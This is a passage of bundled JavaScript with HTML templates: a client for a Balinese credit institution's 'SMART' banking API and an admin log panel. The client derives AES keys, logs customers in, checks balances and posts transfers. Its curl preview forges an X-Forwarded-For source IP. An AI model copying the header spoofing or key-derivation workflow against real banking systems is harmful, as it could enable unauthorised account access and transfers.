        showResult(opName === 'decrypt-body' ? 'decrypt-body' : opName, r.result, true);
      }
    } else {
      showResult(opName === 'decrypt-body' ? 'decrypt-body' : opName, r.error || 'Unknown error', false);
    }
  } catch(e) {
    showResult(opName === 'decrypt-body' ? 'decrypt-body' : opName, 'Fetch error: ' + e.message, false);
  } finally {
    setLoading(btn, false);
  }
}

function buildCurl(res) {
  var h = res.headers || {};
  var b = res.body || {};
  var BS = String.fromCharCode(92);
  var lines = [];
  lines.push('# curl command siap pakai:');
  lines.push('curl -X POST "' + (res.url || '') + '" ' + BS);
  Object.keys(h).forEach(function(k) {
    lines.push('  -H "' + k + ': ' + h[k] + '" ' + BS);
  });
  var bodyStr = JSON.stringify(b, null, 2);
  var sq = String.fromCharCode(39);
  var safeBody = bodyStr.replace(/'/g, sq + BS + sq + sq);
  lines.push("  -d " + sq + safeBody + sq);
  lines.push('');
  lines.push('# === HEADERS ===');
  lines.push(JSON.stringify(h, null, 2));
  lines.push('');
  lines.push('# === BODY (encrypted) ===');
  lines.push(bodyStr);
  lines.push('');
  lines.push('# === DEBUG ===');
  lines.push('refNo    : ' + (res.refNo || ''));
  lines.push('timestamp: ' + (res.ts || ''));
  lines.push('hashRaw  : ' + (res.debug && res.debug.hashRaw ? res.debug.hashRaw : 'N/A'));
  return lines.join(String.fromCharCode(10));
}

// \u2500\u2500 SMART STATE \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
var smartSession = null; // { token, aesKey, aesIv, aesCs, clientIdEnc, baseUrl }
var tfInquiryData = null; // simpan data inquiry untuk posting

// \u2500\u2500 SMART HELPERS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
function getSmartSession() { return smartSession; }

function updateSessionUI() {
  var has = !!smartSession;
  // Login page session bar
  var bar = document.getElementById('smart-session-bar');
  if (bar) bar.style.display = has ? 'block' : 'none';
  // Saldo page
  var salEl = document.getElementById('smart-saldo-session');
  var salNo = document.getElementById('smart-saldo-noauth');
  if (salEl) salEl.style.display = has ? 'block' : 'none';
  if (salNo) salNo.style.display = has ? 'none' : 'flex';
  // Transfer page
  var tfEl = document.getElementById('smart-tf-session');
  var tfNo = document.getElementById('smart-tf-noauth');
  if (tfEl) tfEl.style.display = has ? 'block' : 'none';
  if (tfNo) tfNo.style.display = has ? 'none' : 'flex';

  if (has) {
    // Show session info - JWT is re-generated per request, show AES CS preview instead
    var csPreview = (smartSession.aesCs || '').substring(0, 12) + '...';
    var statusLabel = '\u2705 Login OK (status:00)';
    var els = ['ss-token-preview','saldo-token-preview','tf-token-preview'];
    els.forEach(function(id) {
      var e = document.getElementById(id);
      if (e) e.textContent = statusLabel;
    });
    var full = document.getElementById('ss-token-full');
    if (full) full.value = smartSession.clientIdEnc || '';
    var ssKey = document.getElementById('ss-key');
    if (ssKey) ssKey.textContent = smartSession.aesKey ? smartSession.aesKey.substring(0,20)+'...' : '\u2014';
    var ssIv = document.getElementById('ss-iv');
    if (ssIv) ssIv.textContent = smartSession.aesIv ? smartSession.aesIv.substring(0,20)+'...' : '\u2014';
    var ssCs = document.getElementById('ss-cs');
    if (ssCs) ssCs.textContent = smartSession.aesCs || '\u2014';
    var ssDid = document.getElementById('ss-did');
    if (ssDid) ssDid.textContent = (smartSession.clientIdEnc || '\u2014').substring(0,40) + '...';
    // Show account_list count if available
    var lr = smartSession.loginResult;
    if (lr && lr.account_list) {
      var accs = lr.account_list.split ? lr.account_list.split('|') : [];
      var ssTitle = document.querySelector('#smart-session-bar .session-title');
      if (ssTitle) ssTitle.innerHTML = '<span class="badge-live"><span class="dot"></span>Sesi Aktif</span> &nbsp; ' + (accs.length > 0 ? accs.length + ' Rekening' : 'Login Berhasil');
    }
    // Update nav badge
    var navLogin = document.getElementById('nav-smart-login');
    if (navLogin) navLogin.innerHTML = '<i class="fas fa-check-circle" style="color:#4ade80"></i> Login \u2713';
  } else {
    var navLogin2 = document.getElementById('nav-smart-login');
    if (navLogin2) navLogin2.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login Nasabah';
  }
}

function smartLogout() {
  smartSession = null;
  tfInquiryData = null;
  updateSessionUI();
  showResult('smart-login', 'Logout berhasil. Session dihapus.', true);
}

function copyRaw(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).catch(function(){});
}

// Update tampilan banner login berdasarkan ketersediaan keygen
function updateLoginBanner() {
  var hasKeygen = !!(window._lastKeygen && window._lastKeygen.clientIdEnc);
  var banner   = document.getElementById('sl-autofill-banner');
  var noBanner = document.getElementById('sl-no-keygen-banner');
  var badge    = document.getElementById('sl-keys-badge');
  var step1    = document.getElementById('sl-step1');
  if (banner)   banner.style.display   = hasKeygen ? 'flex'   : 'none';
  if (noBanner) noBanner.style.display = hasKeygen ? 'none'   : 'flex';
  if (badge)    badge.style.display    = hasKeygen ? 'inline' : 'none';
  if (step1)    step1.className        = hasKeygen ? 'step active' : 'step';
}

// Paste / refresh AES keys dari keygen ke form login
function slPasteKeygen() {
  if (window._lastKeygen) {
    var k = window._lastKeygen;
    var elKey = document.getElementById('sl-key');
    var elIv  = document.getElementById('sl-iv');
    var elCs  = document.getElementById('sl-cs');
    var elDid = document.getElementById('sl-did');
    if (elKey && k.aesKey) elKey.value = k.aesKey;
    if (elIv  && k.aesIv)  elIv.value  = k.aesIv;
    if (elCs  && k.aesCs)  elCs.value  = k.aesCs;
    // X-CLIENT-ID
    var did = k.clientIdEnc || window._lastDid || '';
    if (elDid && did) elDid.value = did;
    updateLoginBanner();
  } else {
    alert('Belum ada data Keygen. Silakan jalankan Derive AES Keys terlebih dahulu.');
  }
}

// Preview curl command untuk login (tanpa benar-benar mengirim request)
function slShowCurl() {
  var did     = val('sl-did');
  var aesCs   = val('sl-cs');
  var user    = val('sl-user') || '<user_name>';
  var pass    = val('sl-pass') || '<user_pass>';
  var baseUrl = val('sl-url') || 'https://lpdseminyak.biz.id:8000';

  if (!did || !aesCs) {
    showResult('smart-login', 'Isi X-CLIENT-ID dan AES CS terlebih dahulu (Paste dari Keygen)', false);
    return;
  }

  var md5Note = (user.length === 32 && /^[0-9a-f]+$/i.test(user))
    ? '(sudah MD5)' : '(akan di-MD5 otomatis)';
  var bs = String.fromCharCode(92);
  var q  = String.fromCharCode(39);
  var nl = String.fromCharCode(10);
  var passPreview = pass.length > 8 ? pass.substring(0,4)+'****' : pass;
  var lines = [];
  lines.push('# Login request - body berisi MD5(user_name) dan MD5(user_pass)');
  lines.push('# Header JWT/X-SIGNATURE di-generate otomatis dari private key LPD');
  lines.push('');
  lines.push('curl -X POST "' + baseUrl + '/api/smart/access/login" ' + bs);
  lines.push('  -H "Content-Type: application/json" ' + bs);
  lines.push('  -H "Authorization: <JWT - di-generate dari private_lpd.pem>" ' + bs);
  lines.push('  -H "X-TIMESTAMP: <timestamp Jakarta>" ' + bs);
  lines.push('  -H "X-SIGNATURE: <HMAC-SHA512(jwt:ts,aesCs)>" ' + bs);
  lines.push('  -H "X-PARTNER-ID: <sama dgn X-SIGNATURE>" ' + bs);
  lines.push('  -H "X-CLIENT-ID: ' + did.substring(0,30) + '..." ' + bs);
  lines.push('  -H "X-REFERENCE: <SMY...>" ' + bs);
  lines.push('  -H "X-Forwarded-For: 34.50.74.78" ' + bs);
  lines.push('  -d ' + q + '{"user_name":"<MD5(' + user + ')> ' + md5Note + '","user_pass":"<MD5(' + passPreview + ')>"}' + q);
  lines.push('');
  lines.push('# Respons sukses: {"status":"00","message":"Sukses","account_list":"...","bank_key":"..."}');
  showResult('smart-login', lines.join(nl), true);
}

// Panggil API /api/smart
async function callSmart(payload) {
  var resp = await fetch('/api/smart', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  return resp.json();
}

// \u2500\u2500 SMART LOGIN \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function smartLogin(btn) {
  var aesKey  = val('sl-key');
  var aesIv   = val('sl-iv');
  var aesCs   = val('sl-cs');
  var did     = val('sl-did');
  var user    = val('sl-user');
  var pass    = val('sl-pass');
  var baseUrl = val('sl-url') || 'https://lpdseminyak.biz.id:8000';

  if (!did)           { alert('X-CLIENT-ID wajib diisi! (Paste dari Keygen dulu)'); return; }
  if (!aesCs)         { alert('AES CS wajib diisi! (Paste dari Keygen dulu)'); return; }
  if (!user || !pass) { alert('Username dan Password wajib diisi!'); return; }

  setLoading(btn, true);
  try {
    var r = await callSmart({
      action: 'login', baseUrl: baseUrl,
      aesKey: aesKey, aesIv: aesIv, aesCs: aesCs,
      clientIdEnc: did,
      user_name: user, user_pass: pass,
    });

    // Server mengembalikan status:"00" jika berhasil (tidak ada field "token")
    // Sesi disimpan dengan AES keys untuk request berikutnya
    var loginOk = r.ok && r.result && (
      r.result.status === '00' ||
      r.result.token ||
      (r.result.data && r.result.data.token)
    );

    if (loginOk) {
      // Simpan sesi: gunakan "logged_in" sebagai marker, JWT di-generate ulang tiap request
      smartSession = {
        token: 'LOGGED_IN',  // marker - JWT di-generate ulang tiap request di backend
        aesKey: aesKey, aesIv: aesIv, aesCs: aesCs,
        clientIdEnc: did, baseUrl: baseUrl,
        loginResult: r.result,  // simpan data akun (account_list, bank_key, dll)
      };
      updateSessionUI();
      showResult('smart-login', r, true);
    } else {
      showResult('smart-login', r, false);
    }
  } catch(e) {
    showResult('smart-login', 'Error: ' + e.message, false);
  } finally {
    setLoading(btn, false);
  }
}

// \u2500\u2500 CEK SALDO \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function smartSaldo(btn) {
  var s = getSmartSession();
  if (!s) { alert('Belum login! Silakan login dulu.'); showTab('smart-login'); return; }
  var noRek = val('sb-norek');
  if (!noRek) { alert('Nomor rekening wajib diisi!'); return; }

  setLoading(btn, true);
  try {
    var r = await callSmart({
      action: 'cek-saldo', baseUrl: s.baseUrl,
      token: s.token, aesKey: s.aesKey, aesIv: s.aesIv, aesCs: s.aesCs,
      clientIdEnc: s.clientIdEnc,
      no_rek: noRek,
    });
    showResult('smart-saldo', r, r.ok);
  } catch(e) {
    showResult('smart-saldo', 'Error: ' + e.message, false);
  } finally {
    setLoading(btn, false);
  }
}

// \u2500\u2500 TRANSFER INQUIRY \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function smartInquiry(btn) {
  var s = getSmartSession();
  if (!s) { alert('Belum login!'); showTab('smart-login'); return; }

  var from    = val('tf-from');
  var to      = val('tf-to');
  var nominal = val('tf-nominal');
  var bank    = val('tf-bank');

  if (!from || !to || !nominal) { alert('No. rekening asal, tujuan, dan nominal wajib diisi!'); return; }

  setLoading(btn, true);
  try {
    var r = await callSmart({
      action: 'inquiry', baseUrl: s.baseUrl,
      token: s.token, aesKey: s.aesKey, aesIv: s.aesIv, aesCs: s.aesCs,
      clientIdEnc: s.clientIdEnc,
      no_rek_from: from, no_rek_to: to, nominal: nominal, bank_dest: bank,
    });

    showResult('smart-inquiry', r, r.ok);

    if (r.ok) {
      // Simpan data inquiry untuk posting
      tfInquiryData = { from: from, to: to, nominal: nominal, bank: bank,
                        ref: (r.debug && r.debug.ref) || '', inquiryResult: r.result };
      // Update confirmation box
      document.getElementById('cf-from').textContent    = from;
      document.getElementById('cf-to').textContent      = to;
      document.getElementById('cf-nominal').textContent = 'Rp ' + Number(nominal).toLocaleString('id-ID');
      document.getElementById('cf-bank').textContent    = bank || 'Intrabank (LPD)';
      document.getElementById('cf-ref').textContent     = tfInquiryData.ref || '\u2014';
      // Show confirm panel & update steps
      document.getElementById('tf-panel-confirm').style.display = 'block';
      document.getElementById('tf-step1').className = 'step done';
      document.getElementById('tf-step2').className = 'step active';
      // Scroll to confirm
      document.getElementById('tf-panel-confirm').scrollIntoView({ behavior: 'smooth' });
    }
  } catch(e) {
    showResult('smart-inquiry', 'Error: ' + e.message, false);
  } finally {
    setLoading(btn, false);
  }
}

// \u2500\u2500 TRANSFER POSTING \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
async function smartPosting(btn) {
  var s = getSmartSession();
  if (!s) { alert('Belum login!'); return; }
  if (!tfInquiryData) { alert('Lakukan Inquiry terlebih dahulu!'); return; }

  var namaDest = val('tf-nama-dest');
  var ket      = val('tf-ket');

  if (!confirm('Konfirmasi transfer Rp ' + Number(tfInquiryData.nominal).toLocaleString('id-ID') + ' ke rekening ' + tfInquiryData.to + '?')) return;

  setLoading(btn, true);
  try {
    var r = await callSmart({
      action: 'posting', baseUrl: s.baseUrl,
      token: s.token, aesKey: s.aesKey, aesIv: s.aesIv, aesCs: s.aesCs,
      clientIdEnc: s.clientIdEnc,
      no_rek_from: tfInquiryData.from,
      no_rek_to:   tfInquiryData.to,
      nominal:     tfInquiryData.nominal,
      bank_dest:   tfInquiryData.bank,
      nama_dest:   namaDest,
      keterangan:  ket,
      transNo:     tfInquiryData.ref,
    });

    showResult('smart-posting', r, r.ok);

    if (r.ok) {
      document.getElementById('tf-step2').className = 'step done';
      document.getElementById('tf-step3').className = 'step done';
      document.getElementById('result-smart-posting').scrollIntoView({ behavior: 'smooth' });
    }
  } catch(e) {
    showResult('smart-posting', 'Error: ' + e.message, false);
  } finally {
    setLoading(btn, false);
  }
}

// Reset transfer form
function tfReset() {
  tfInquiryData = null;
  document.getElementById('tf-panel-confirm').style.display = 'none';
  document.getElementById('tf-step1').className = 'step active';
  document.getElementById('tf-step2').className = 'step';
  document.getElementById('tf-step3').className = 'step';
  var r = document.getElementById('result-smart-inquiry');
  if (r) r.className = 'result-box';
}

// \u2500\u2500 Init \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
// Isi timestamp sekarang ke field keygen
fillNow('kg-ts');
// Saat halaman load, update banner login (mungkin ada data dari session sebelumnya)
updateLoginBanner();
<\/script>
</body>
</html>`;
}
__name(Ka, "Ka");
function Ua() {
  return `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>LPD Seminyak \u2014 Admin Panel</title>
<script src="https://cdn.tailwindcss.com"><\/script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"/>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"><\/script>
<style>
:root{--primary:#0f766e;--primary-dark:#0d5752;--secondary:#0f172a;--sidebar-w:240px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}

/* \u2500\u2500 SIDEBAR \u2500\u2500 */
#sidebar{position:fixed;top:0;left:0;width:var(--sidebar-w);height:100vh;background:#134e4a;overflow-y:auto;z-index:100;border-right:1px solid #0d3b37;display:flex;flex-direction:column}
#sidebar .logo{padding:16px 14px 12px;background:linear-gradient(135deg,#0d3b37,#0f766e);border-bottom:1px solid #0d3b37}
#sidebar .logo h1{font-size:14px;font-weight:800;color:#fff;letter-spacing:.5px}
#sidebar .logo p{font-size:10px;color:#99f6e4;margin-top:2px}
#sidebar nav{flex:1;padding:8px 0}
#sidebar nav a{display:flex;align-items:center;gap:9px;padding:9px 14px;font-size:12px;color:#99f6e4;text-decoration:none;transition:all .15s;cursor:pointer;border-left:3px solid transparent}
#sidebar nav a:hover,#sidebar nav a.active{color:#fff;background:rgba(20,184,166,.2);border-left-color:#14b8a6}
#sidebar nav a i{width:16px;text-align:center;font-size:12px}
#sidebar .nav-section{padding:10px 14px 3px;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:1.5px;color:#0d6b65}
#sidebar .sidebar-footer{padding:12px 14px;border-top:1px solid #0d3b37;font-size:10px;color:#4d9e99}

/* \u2500\u2500 MAIN \u2500\u2500 */
#main{margin-left:var(--sidebar-w);min-height:100vh;padding:0 0 40px}
.topbar{background:#134e4a;border-bottom:1px solid #0d3b37;padding:12px 24px;display:flex;align-items:center;justify-content:space-between}
.topbar h2{font-size:15px;font-weight:700;color:#a7f3d0}
.topbar-right{display:flex;align-items:center;gap:12px;font-size:11px;color:#5eead4}
.section{display:none}.section.active{display:block}
.content{padding:20px 24px}

/* \u2500\u2500 CARDS \u2500\u2500 */
.stat-card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:16px;position:relative;overflow:hidden;transition:border-color .2s}
.stat-card:hover{border-color:#14b8a6}
.stat-card .sc-icon{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;margin-bottom:10px}
.stat-card .sc-val{font-size:26px;font-weight:800;color:#e2e8f0;line-height:1}
.stat-card .sc-label{font-size:11px;color:#64748b;margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
.stat-card .sc-sub{font-size:11px;color:#14b8a6;margin-top:4px}

/* \u2500\u2500 PANEL \u2500\u2500 */
.panel{background:#1e293b;border:1px solid #334155;border-radius:10px;margin-bottom:16px;overflow:hidden}
.panel-header{padding:12px 16px;background:#0f172a;border-bottom:1px solid #1e293b;display:flex;align-items:center;justify-content:space-between}
.panel-header-left{display:flex;align-items:center;gap:8px}
.panel-header h3{font-size:13px;font-weight:700;color:#5eead4}
.panel-header .badge{font-size:10px;padding:2px 7px;border-radius:999px;background:#134e4a;color:#5eead4;font-weight:600}
.panel-body{padding:16px}

/* \u2500\u2500 TABLE \u2500\u2500 */
.data-table{width:100%;border-collapse:collapse;font-size:12px}
.data-table th{text-align:left;padding:8px 12px;background:#0f172a;color:#64748b;font-weight:600;text-transform:uppercase;letter-spacing:.5px;font-size:10px;border-bottom:1px solid #1e293b;white-space:nowrap}
.data-table td{padding:8px 12px;border-bottom:1px solid #1e293b;color:#cbd5e1;vertical-align:top}
.data-table tr:last-child td{border-bottom:none}
.data-table tr:hover td{background:rgba(20,184,166,.04)}
.data-table td.mono{font-family:'Courier New',monospace;font-size:11px;color:#67e8f9;word-break:break-all}
.data-table td.ts{font-family:'Courier New',monospace;font-size:11px;color:#94a3b8;white-space:nowrap}
.data-table td.url{font-family:'Courier New',monospace;font-size:10px;color:#a5b4fc;word-break:break-all;max-width:200px}
.data-table td.status-ok{color:#34d399;font-weight:700}
.data-table td.status-err{color:#f87171;font-weight:700}
.data-table td.status-warn{color:#fbbf24;font-weight:700}

/* \u2500\u2500 BUTTONS \u2500\u2500 */
.btn{display:inline-flex;align-items:center;gap:6px;padding:7px 14px;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer;border:none;transition:all .15s;text-transform:uppercase;letter-spacing:.5px}
.btn-primary{background:linear-gradient(135deg,#0f766e,#0d6b65);color:#fff}
.btn-primary:hover{background:linear-gradient(135deg,#0d6b65,#0a5952);transform:translateY(-1px)}
.btn-secondary{background:#1e293b;border:1px solid #334155;color:#94a3b8}
.btn-secondary:hover{background:#334155;color:#e2e8f0}
.btn-sm{padding:4px 10px;font-size:10px}
.btn:disabled{opacity:.5;cursor:not-allowed;transform:none!important}

/* \u2500\u2500 FORM \u2500\u2500 */
label{display:block;font-size:10px;font-weight:700;color:#64748b;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
input[type=text],input[type=date],select,textarea{width:100%;background:#0f172a;border:1px solid #334155;border-radius:6px;padding:8px 10px;color:#e2e8f0;font-size:12px;font-family:'Courier New',monospace;outline:none;transition:border .15s}
input[type=text]:focus,input[type=date]:focus,select:focus,textarea:focus{border-color:#0f766e}
select{cursor:pointer}

/* \u2500\u2500 MISC \u2500\u2500 */
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
.grid-4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:14px}
@media(max-width:1100px){.grid-4{grid-template-columns:1fr 1fr}}
@media(max-width:900px){.grid-2,.grid-3,.grid-4{grid-template-columns:1fr}}
.field-row{margin-bottom:10px}
.info-box{padding:10px 14px;border-radius:8px;font-size:12px;margin:10px 0;display:flex;gap:9px;align-items:flex-start;line-height:1.6}
.info-box i{margin-top:2px;flex-shrink:0}
.info-teal{background:#0d3b37;border-left:3px solid #14b8a6;color:#99f6e4}
.info-yellow{background:#1c1200;border-left:3px solid #d97706;color:#fcd34d}
.info-red{background:#2d0000;border-left:3px solid #dc2626;color:#fca5a5}
.badge-pill{display:inline-block;padding:2px 8px;border-radius:999px;font-size:10px;font-weight:700}
.badge-ok{background:#022c22;color:#34d399}
.badge-warn{background:#2c1900;color:#fbbf24}
.badge-err{background:#2d0000;color:#f87171}
.badge-info{background:#0d3b37;color:#5eead4}
.spinner{width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#14b8a6;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
@keyframes spin{to{transform:rotate(360deg)}}
.empty-state{text-align:center;padding:40px 20px;color:#475569}
.empty-state i{font-size:36px;margin-bottom:10px;display:block}
.log-entry{border:1px solid #1e293b;border-radius:8px;margin-bottom:8px;overflow:hidden;background:#0a0f1a}
.log-entry-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:#0f172a;cursor:pointer;user-select:none}
.log-entry-body{padding:12px;font-size:11px;font-family:'Courier New',monospace;color:#7dd3fc;white-space:pre-wrap;word-break:break-all;display:none;max-height:300px;overflow-y:auto;line-height:1.6}
.log-entry-body.show{display:block}
.method-tag{font-size:9px;font-weight:800;padding:2px 7px;border-radius:4px}
.method-post{background:#1e1b4b;color:#a78bfa}
.method-get{background:#022c22;color:#34d399}
.search-bar{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:12px}
.search-bar input,.search-bar select{flex:1;min-width:120px;padding:7px 10px;font-size:12px}
.pagination{display:flex;align-items:center;justify-content:space-between;padding:10px 0;font-size:11px;color:#64748b}
.pagination-btns{display:flex;gap:6px}
.chart-container{position:relative;height:180px}
.section-title{font-size:13px;font-weight:700;color:#5eead4;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.section-title i{font-size:14px}
.tag{display:inline-block;padding:2px 6px;border-radius:4px;font-size:10px;font-weight:600;background:#1e293b;color:#94a3b8;margin:1px}
.separator{height:1px;background:#1e293b;margin:12px 0}
.truncate-cell{max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:help}

/* \u2500\u2500 MOBILE \u2500\u2500 */
#menu-toggle{display:none;background:none;border:none;color:#5eead4;font-size:20px;cursor:pointer;padding:4px}
#sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99}
#sidebar-overlay.show{display:block}
@media(max-width:768px){
  #menu-toggle{display:block}
  #sidebar{transform:translateX(-100%);transition:transform .25s}
  #sidebar.open{transform:translateX(0)}
  #sidebar-overlay.show{display:block}
  #main{margin-left:0}
  .topbar{padding:10px 14px}
}
</style>
</head>
<body>

<!-- Sidebar overlay -->
<div id="sidebar-overlay" onclick="closeSidebar()"></div>

<!-- \u2500\u2500 SIDEBAR \u2500\u2500 -->
<aside id="sidebar">
  <div class="logo">
    <h1><i class="fas fa-university mr-2"></i>LPD Seminyak</h1>
    <p>Admin Management Panel</p>
  </div>
  <nav>
    <div class="nav-section">Dashboard</div>
    <a href="#" onclick="showSection('dashboard')" id="nav-dashboard" class="active">
      <i class="fas fa-tachometer-alt"></i> Overview
    </a>
    <a href="#" onclick="showSection('activity')" id="nav-activity">
      <i class="fas fa-chart-line"></i> Aktivitas Harian
    </a>

    <div class="nav-section">Monitoring</div>
    <a href="#" onclick="showSection('logs-access')" id="nav-logs-access">
      <i class="fas fa-sign-in-alt"></i> Log Akses Nasabah
    </a>
    <a href="#" onclick="showSection('logs-transfer')" id="nav-logs-transfer">
      <i class="fas fa-exchange-alt"></i> Log Transfer
    </a>
    <a href="#" onclick="showSection('logs-tabungan')" id="nav-logs-tabungan">
      <i class="fas fa-piggy-bank"></i> Log Tabungan
    </a>
    <a href="#" onclick="showSection('logs-token')" id="nav-logs-token">
      <i class="fas fa-key"></i> Log Token / SNAP
    </a>

    <div class="nav-section">Analisis</div>
    <a href="#" onclick="showSection('stats')" id="nav-stats">
      <i class="fas fa-chart-bar"></i> Statistik API
    </a>
    <a href="#" onclick="showSection('errors')" id="nav-errors">
      <i class="fas fa-exclamation-triangle"></i> Error Log
    </a>

    <div class="nav-section">Transaksi</div>
    <a href="#" onclick="showSection('trx')" id="nav-trx">
      <i class="fas fa-terminal"></i> Jalankan Transaksi
    </a>
    <a href="#" onclick="showSection('trx-history')" id="nav-trx-history">
      <i class="fas fa-history"></i> Riwayat Transaksi
    </a>

    <div class="nav-section">Sistem</div>
    <a href="#" onclick="showSection('crypto-ops')" id="nav-crypto-ops">
      <i class="fas fa-lock"></i> Crypto Test
    </a>
    <a href="/crypto" target="_blank">
      <i class="fas fa-tools"></i> Crypto Toolkit <i class="fas fa-external-link-alt ml-1" style="font-size:9px"></i>
    </a>
    <a href="/swagger" target="_blank">
      <i class="fas fa-book"></i> Swagger API <i class="fas fa-external-link-alt ml-1" style="font-size:9px"></i>
    </a>
  </nav>
  <div class="sidebar-footer">
    <div><i class="fas fa-circle" style="color:#22c55e;font-size:7px"></i> Production: lpdseminyak.biz.id</div>
    <div style="margin-top:3px"><i class="fas fa-clock"></i> <span id="sidebar-time">\u2014</span></div>
  </div>
</aside>

<!-- \u2500\u2500 MAIN \u2500\u2500 -->
<main id="main">

  <!-- TOPBAR -->
  <div class="topbar">
    <div style="display:flex;align-items:center;gap:10px">
      <button id="menu-toggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button>
      <h2 id="topbar-title"><i class="fas fa-tachometer-alt mr-2"></i>Overview</h2>
    </div>
    <div class="topbar-right">
      <span id="topbar-date" style="font-size:11px;color:#5eead4"></span>
      <button class="btn btn-secondary btn-sm" onclick="refreshAll()"><i class="fas fa-sync-alt"></i> Refresh</button>
    </div>
  </div>

  <!-- \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550
       SECTION: DASHBOARD
  \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550 -->
  <div id="section-dashboard" class="section active content">

    <div class="grid-4" style="margin-bottom:16px" id="stat-cards">
      <div class="stat-card">
